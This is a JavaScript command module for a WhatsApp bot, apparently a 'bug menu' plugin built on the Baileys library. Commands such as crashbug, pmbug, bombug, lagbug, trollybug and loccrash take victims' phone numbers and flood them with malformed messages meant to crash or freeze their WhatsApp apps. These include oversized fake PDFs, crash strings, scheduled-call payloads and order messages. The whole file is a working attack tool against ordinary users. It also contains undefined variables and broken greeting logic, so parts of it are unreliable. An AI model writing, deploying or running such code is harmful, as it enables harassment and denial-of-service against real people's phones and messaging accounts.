const { smd } = require("../lib");
const { delay, loading, react } = require("utils");
const moment = require("moment-timezone");
const config = require("../config.js");
const fs = require("fs");
const path = require("path");
const {
    generateWAMessageFromContent,
    proto
} = require("@whiskeysockets/baileys");

// bug database
const { bugtext1 } = require("../lib/bugs/xeontext1");
const { bugtext2 } = require("../lib/bugs/xeontext2");
const { bugtext3 } = require("../lib/bugs/xeontext3");
const { bugtext4 } = require("../lib/bugs/xeontext4");
const { bugtext5 } = require("../lib/bugs/xeontext5");
const { bugtext6 } = require("../lib/bugs/xeontext6");

const category = "dev";
const reaction = "😈";

const mess = {};
mess.prem = "You are not authorised to use this  command !!!";

const phoneRegex = /^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/;
const whatsappRegex =
    /https:\/\/chat\.whatsapp\.com\/(invite|join|)[A-Za-z0-9]+/;

const timewisher = time => {
    if (time < "23:59:00") {
        return `Good Night 🌆`;
    } else if (time < "19:00:00") {
        return `Good Evening 🌆`;
    } else if (time < "18:00:00") {
        return `Good Evening 🌆`;
    } else if (time < "15:00:00") {
        return `Good Afternoon 🌅`;
    } else if (time < "11:00:00") {
        return `Good Morning 🌄`;
    } else if (time < "05:00:00") {
        return `Good Morning 🌄`;
    }
};

async function relaybug(dest, smd, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        if (!phoneRegex.test(victims[i])) {
            repondre(`${victims[i]} not a valid phone number`);
            continue;
        } else {
            const victim = victims[i] + "@s.whatsapp.net";
            for (let j = 0; j < amount; j++) {
                var scheduledCallCreationMessage = generateWAMessageFromContent(
                    dest,
                    proto.Message.fromObject(bug),
                    { userJid: dest, quoted: ms }
                );
                try {
                    smd.relayMessage(
                        victim,
                        scheduledCallCreationMessage.message,
                        { messageId: scheduledCallCreationMessage.key.id }
                    );
                } catch (e) {
                    repondre(
                        `An error occured while sending bugs to ${victims[i]}`
                    );
                    console.log(
                        `An error occured while sending bugs to ${victim}: ${e}`
                    );
                    break;
                }
                await delay(3000);
            }
            if (victims.length > 1)
                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
            await delay(5000);
        }
    }
    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
}

async function sendbug(dest, smd, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        if (!phoneRegex.test(victims[i])) {
            repondre(`${victims[i]} not a valid phone number`);
            continue;
        } else {
            const victim = victims[i] + "@s.whatsapp.net";
            for (let j = 0; j < amount; j++) {
                try {
                    smd.sendMessage(victim, bug);
                } catch (e) {
                    repondre(
                        `An error occured while sending bugs to ${victims[i]}`
                    );
                    console.log(
                        `An error occured while sending bugs to ${victim}: ${e}`
                    );
                    break;
                }
                await delay(3000);
            }
            if (victims.length > 1)
                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
            await delay(5000);
        }
    }
    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
}


// --cmds--

// bug menu
smd(
    {
        nomCom: "bugmenu",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre } = commandOptions;
        const mono = "```";
        const time = moment().tz(conf.TZ).format("HH:mm:ss");
        const versions = ["v1", "v2"];
        const version = versions[Math.floor(Math.random() * versions.length)];
        const menuImage = fs.readFileSync(
            path.resolve(
                path.join(__dirname, "..", "media", "deleted-message.jpg")
            )
        );
        const tumbUrl =
            "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg";
        let menu = `${mono}Hello ${ms.pushName}
${timewisher(time)}

┏❏ ⌜ 𝐓𝐊𝐌-𝐁𝐎𝐓 𝐛𝐮𝐠 𝐦𝐞𝐧𝐮 ⌟  ❐
┃⎔ bug
┃⎔ crash
┃⎔ loccrash
┃⎔ amountbug <amount>
┃⎔ crashbug 263XXXX
┃⎔ pmbug 263XXXX
┃⎔ delaybug 263XXXX
┃⎔ trollybug 263XXXX
┃⎔ docubug 263XXXX
┃⎔ unlimitedbug 263XXXX
┃⎔ bombug 263XXXX
┃⎔ lagbug 263XXXX
┃⎔ gcbug <grouplink>
┃⎔ delaygcbug <grouplink>
┃⎔ trollygcbug <grouplink>
┃⎔ laggcbug <grouplink>
┃⎔ bomgcbug <grouplink>
┃⎔ unlimitedgcbug <grouplink>
┃⎔ docugcbug <grouplink>
┗❏${mono}`;
        switch (version) {
            case "v1":
                {
                    smd.sendMessage(
                        dest,
                        {
                            image: menuImage,
                            caption: menu
                        },
                        { quoted: ms }
                    );
                }
                break;
            case "v2":
                {
                    smd.sendMessage(
                        dest,
                        {
                            image: menuImage,
                            caption: menu,
                            contextInfo: {
                                mentionedJid: [ms.key.remoteJid],
                                forwardingScore: 9999999,
                                isForwarded: true,
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: `${conf.BOT}`,
                                    body: `Bot Created By ${conf.OWNER_NAME}`,
                                    thumbnail: { url: tumbUrl },
                                    thumbnailUrl: tumbUrl,
                                    previewType: "PHOTO",
                                    sourceUrl:
                                        "https://whatsapp.com/channel/0029VaKjSra9WtC0kuJqvl0g",
                                    mediaType: 1,
                                    renderLargerAbhinail: true
                                }
                            }
                        },
                        { quoted: ms }
                    );
                }
                break;
        }
    }
);

//bug
smd(
    {
        nomCom: "bug",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        if (!superUser) return await repondre(mess.prem);

        // send loading message
        await loading(dest, smd);

        for (let i = 0; i < 25; i++) {
            const doc = { url: "./set.js" };
            await smd.sendMessage(dest, {
                document: doc,
                mimetype:
                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
                title: "bx.pdf",
                pageCount: 9999999999,
                thumbnail: {
                    url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
                },
                thumbnailUrl:
                    "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
                jpegThumbnail: {
                    url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
                },
                mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
                fileName:
                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
                    bugpdf
            });
        }
        await smd.sendMessage(dest, { react: { text: "✅", key: ms.key } });
    }
);

//crash
smd(
    {
        nomCom: "crash",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        const bug = bugtext6;
        if (!superUser) return await repondre(mess.prem);
        await loading(dest, smd);
        try {
            for (let i = 0; i < 10; i++) {
                await repondre(bug);
            }
        } catch (e) {
            await repondre(`an error occoured sending bugs`);
            console.log(`an error occured sending bugs : ${e}`);
            return;
        }
    }
);

//loccrash
smd(
    {
        nomCom: "loccrash",
        reaction: "\uD83D\uDD16",
        categorie: category
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        await loading(dest, smd);

        for (let i = 0; i < 20; i++) {
            for (let j = 0; j < "3"; j++) {
                smd.sendMessage(
                    dest,
                    {
                        location: {
                            degreesLatitude: -6.28282828,
                            degreesLongitude: -1.2828,
                            name: "BRUX0N3RD\n\n\n\n\n\n\n\n"
                        }
                    },
                    { quoted: ms }
                );
            }
        }
        await smd.sendMessage(dest, { react: { text: "✅", key: ms.key } });
    }
);

//crashbug
smd(
    {
        nomCom: "crashbug",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}crashbug amount | numbers\n> Example ${prefixe}crashbug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}crashbug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, smd);
        const text = arg.join("");
        let amount = 30;
        let victims = [];
        const doc = { url: "./set.js" };
        const bug = {
            document: doc,
            mimetype:
                "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
            title: "bx.pdf",
            pageCount: 9999999999,
            thumbnail: {
                url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
            },
            thumbnailUrl:
                "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
            jpegThumbnail: {
                url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
            },
            mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
            fileName:
                "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
                bugpdf
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await sendbug(dest, smd, ms, repondre, amount, victims, bug);
            } catch (e) {
                await repondre("An error occured");
                console.log(`An error occured: ${e}`);
                await react(dest, smd, ms, "⚠️");
            }
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (isNaN(amount)) {
                return await repondre(
                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                );
            } else {
                victims = text
                    .split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                if (victims.length > 0) {
                    await repondre(
                        `sending ${amount} bugs to ${victims.join(", ")}`
                    );
                    try {
                        await sendbug(
                            dest,
                            smd,
                            ms,
                            repondre,
                            amount,
                            victims,
                            bug
                        );
                    } catch (e) {
                        await repondre("An error occured");
                        console.log(`An error occured: ${e}`);
                        await react(dest, smd, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specfied");
                }
            }
        }
        await react(dest, smd, ms, "✅");
    }
);

// amountbug
smd(
    {
        nomCom: "amountbug",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;

        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}amountbug amount\n> Example ${prefixe}amountbug 5`
            );

        const amount = parseInt(arg[0]);
        if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
            return await repondre(
                `use a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
            );
        for (let i = 0; i < amount; i++) {
            const bug = `${bugtext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
                dest,
                proto.Message.fromObject({
                    scheduledCallCreationMessage: {
                        callType: "2",
                        scheduledTimestampMs: `${moment(1000)
                            .tz("Asia/Kolkata")
                            .format("DD/MM/YYYY HH:mm:ss")}`,
                        title: bug
                    }
                }),
                { userJid: dest, quoted: ms }
            );
            try {
                await smd.relayMessage(
                    victim,
                    scheduledCallCreationMessage.message,
                    { messageId: scheduledCallCreationMessage.key.id }
                );
            } catch (e) {
                await repondre(`An error occured while sending bugs`);
                console.log(`An error occured while sending bugs: ${e}`);
                return;
            }
            await delay(3000);
        }
        await repondre(
            `*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`
        );
        await react(dest, smd, ms, "✅");
    }
);

//pmbug
smd(
    {
        nomCom: "pmbug",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}pmbug amount | numbers\n> Example ${prefixe}pmbug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}pmbug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, smd);
        const text = arg.join("");
        let amount = 30;
        let victims = [];
        const bug = {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                title: `${bugtext1}`
            }
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await relaybug(dest, smd, ms, repondre, amount, victims, bug);
            } catch (e) {
                await repondre("An error occured");
                console.log(`An error occured: ${e}`);
                await react(dest, smd, ms, "⚠️");
            }
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (
                amount > conf.BOOM_MESSAGE_LIMIT ||
                isNaN(amount) ||
                amount < 1
            ) {
                return await repondre(
                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                );
            } else {
                victims = text
                    .split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                if (victims.length > 0) {
                    await repondre(
                        `sending ${amount} bugs to ${victims.join(", ")}`
                    );
                    try {
                        await relaybug(
                            dest,
                            smd,
                            ms,
                            repondre,
                            amount,
                            victims,
                            bug
                        );
                    } catch (e) {
                        await repondre("An error occured");
                        console.log(`An error occured: ${e}`);
                        await react(dest, smd, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specfied");
                }
            }
        }
        await react(dest, smd, ms, "✅");
    }
);

//delaybug
smd(
    {
        nomCom: "delaybug",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}delaybug amount | numbers\n> Example ${prefixe}delaybug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}delaybug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, smd);
        const text = arg.join("");
        let amount = 30;
        let victims = [];
        const bug = {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                title: bugtext2
            }
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await relaybug(dest, smd, ms, repondre, amount, victims, bug);
            } catch (e) {
                await repondre("An error occured");
                console.log(`An error occured: ${e}`);
                await react(dest, smd, ms, "⚠️");
            }
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (
                amount > conf.BOOM_MESSAGE_LIMIT ||
                isNaN(amount) ||
                amount < 1
            ) {
                return await repondre(
                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                );
            } else {
                victims = text
                    .split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                if (victims.length > 0) {
                    await repondre(
                        `sending ${amount} bugs to ${victims.join(", ")}`
                    );
                    try {
                        await relaybug(
                            dest,
                            smd,
                            ms,
                            repondre,
                            amount,
                            victims,
                            bug
                        );
                    } catch (e) {
                        await repondre("An error occured");
                        console.log(`An error occured: ${e}`);
                        await react(dest, smd, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specfied");
                }
            }
        }
        await react(dest, smd, ms, "✅");
    }
);

//docubug
smd(
    {
        nomCom: "docubug",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}docubug amount | numbers\n> Example ${prefixe}docubug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}docubug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, smd);
        const text = arg.join("");
        let amount = 15;
        let victims = [];
        const bug = {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                title: `${bugtext1}`
            }
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await relaybug(dest, smd, ms, repondre, amount, victims, bug);
            } catch (e) {
                await repondre("An error occured");
                console.log(`An error occured: ${e}`);
                await react(dest, smd, ms, "⚠️");
            }
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (
                amount > conf.BOOM_MESSAGE_LIMIT ||
                isNaN(amount) ||
                amount < 1
            ) {
                return await repondre(
                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                );
            } else {
                victims = text
                    .split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                if (victims.length > 0) {
                    await repondre(
                        `sending ${amount} bugs to ${victims.join(", ")}`
                    );
                    try {
                        await relaybug(
                            dest,
                            smd,
                            ms,
                            repondre,
                            amount,
                            victims,
                            bug
                        );
                    } catch (e) {
                        await repondre("An error occured");
                        console.log(`An error occured: ${e}`);
                        await react(dest, smd, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specfied");
                }
            }
        }
        await react(dest, smd, ms, "✅");
    }
);

//unlimitedbug
smd(
    {
        nomCom: "unlimitedbug",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}unlimitedbug amount | numbers\n> Example ${prefixe}unlimitedbug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}unlimitedbug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, smd);
        const text = arg.join("");
        let amount = 30;
        let victims = [];
        const bug = {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                title: bugtext3
            }
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await relaybug(dest, smd, ms, repondre, amount, victims, bug);
            } catch (e) {
                await repondre("An error occured");
                console.log(`An error occured: ${e}`);
                await react(dest, smd, ms, "⚠️");
            }
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (
                amount > conf.BOOM_MESSAGE_LIMIT ||
                isNaN(amount) ||
                amount < 1
            ) {
                return await repondre(
                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                );
            } else {
                victims = text
                    .split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                if (victims.length > 0) {
                    await repondre(
                        `sending ${amount} bugs to ${victims.join(", ")}`
                    );
                    try {
                        await relaybug(
                            dest,
                            smd,
                            ms,
                            repondre,
                            amount,
                            victims,
                            bug
                        );
                    } catch (e) {
                        await repondre("An error occured");
                        console.log(`An error occured: ${e}`);
                        await react(dest, smd, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specfied");
                }
            }
        }
        await react(dest, smd, ms, "✅");
    }
);

//bombug
smd(
    {
        nomCom: "bombug",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}bombug amount | numbers\n> Example ${prefixe}bombug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}bombug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, smd);
        const text = arg.join("");
        let amount = 30;
        let victims = [];
        const bug = {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                title: bugtext4
            }
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await relaybug(dest, smd, ms, repondre, amount, victims, bug);
            } catch (e) {
                await repondre("An error occured");
                console.log(`An error occured: ${e}`);
                await react(dest, smd, ms, "⚠️");
            }
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (
                amount > conf.BOOM_MESSAGE_LIMIT ||
                isNaN(amount) ||
                amount < 1
            ) {
                return await repondre(
                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                );
            } else {
                victims = text
                    .split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                if (victims.length > 0) {
                    await repondre(
                        `sending ${amount} bugs to ${victims.join(", ")}`
                    );
                    try {
                        await relaybug(
                            dest,
                            smd,
                            ms,
                            repondre,
                            amount,
                            victims,
                            bug
                        );
                    } catch (e) {
                        await repondre("An error occured");
                        console.log(`An error occured: ${e}`);
                        await react(dest, smd, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specfied");
                }
            }
        }
        await react(dest, smd, ms, "✅");
    }
);

//lagbug
smd(
    {
        nomCom: "lagbug",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}lagbug amount | numbers\n> Example ${prefixe}lagbug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}lagbug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, smd);
        const text = arg.join("");
        let amount = 30;
        let victims = [];
        const bug = {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                title: bugtext2
            }
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await relaybug(dest, smd, ms, repondre, amount, victims, bug);
            } catch (e) {
                await repondre("An error occured");
                console.log(`An error occured: ${e}`);
                await react(dest, smd, ms, "⚠️");
            }
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (
                amount > conf.BOOM_MESSAGE_LIMIT ||
                isNaN(amount) ||
                amount < 1
            ) {
                return await repondre(
                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                );
            } else {
                victims = text
                    .split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                if (victims.length > 0) {
                    await repondre(
                        `sending ${amount} bugs to ${victims.join(", ")}`
                    );
                    try {
                        await relaybug(
                            dest,
                            smd,
                            ms,
                            repondre,
                            amount,
                            victims,
                            bug
                        );
                    } catch (e) {
                        await repondre("An error occured");
                        console.log(`An error occured: ${e}`);
                        await react(dest, smd, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specfied");
                }
            }
        }
        await react(dest, smd, ms, "✅");
    }
);

//trollybug
smd(
    {
        nomCom: "trollybug",
        categorie: category,
        reaction: reaction
    },

    async (dest, smd, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}trollybug amount | numbers\n> Example ${prefixe}trollybug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}trollybug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, smd);
        const text = arg.join("");
        let amount = 15;
        let victims = [];
        const bug = {
            orderMessage: {
                orderId: "599519108102353",
                thumbnail: fs.readFileSync(
                    path.resolve(
                        path.join(
                            __dirname,
                            "..",
                            "media",
                            "deleted-message.jpg"
                        )
                    )
                ),
                itemCount: 1999,
                status: "INQUIRY",
                surface: "CATALOG",
                message: `${conf.BOT}`,
                orderTitle: " TROLLY BUG ",
                sellerJid: "263785028126@s.whatsapp.net",
                token: "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
            }
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await relaybug(dest, smd, ms, repondre, amount, victims, bug);
            } catch (e) {
                await repondre("An error occured");
                console.log(`An error occured: ${e}`);
                await react(dest, smd, ms, "⚠️");
            }
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (
                amount > conf.BOOM_MESSAGE_LIMIT ||
                isNaN(amount) ||
                amount < 1
            ) {
                return await repondre(
                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                );
            } else {
                victims = text
                    .split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                if (victims.length > 0) {
                    await repondre(
                        `sending ${amount} bugs to ${victims.join(", ")}`
                    );
                    try {
                        await relaybug(
                            dest,
                            smd,
                            ms,
                            repondre,
                            amount,
                            victims,
                            bug
                        );
                    } catch (e) {
                        await repondre("An error occured");
                        console.log(`An error occured: ${e}`);
                        await react(dest, smd, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specfied");
                }
            }
        }
        await react(dest, smd, ms, "✅");
    }
);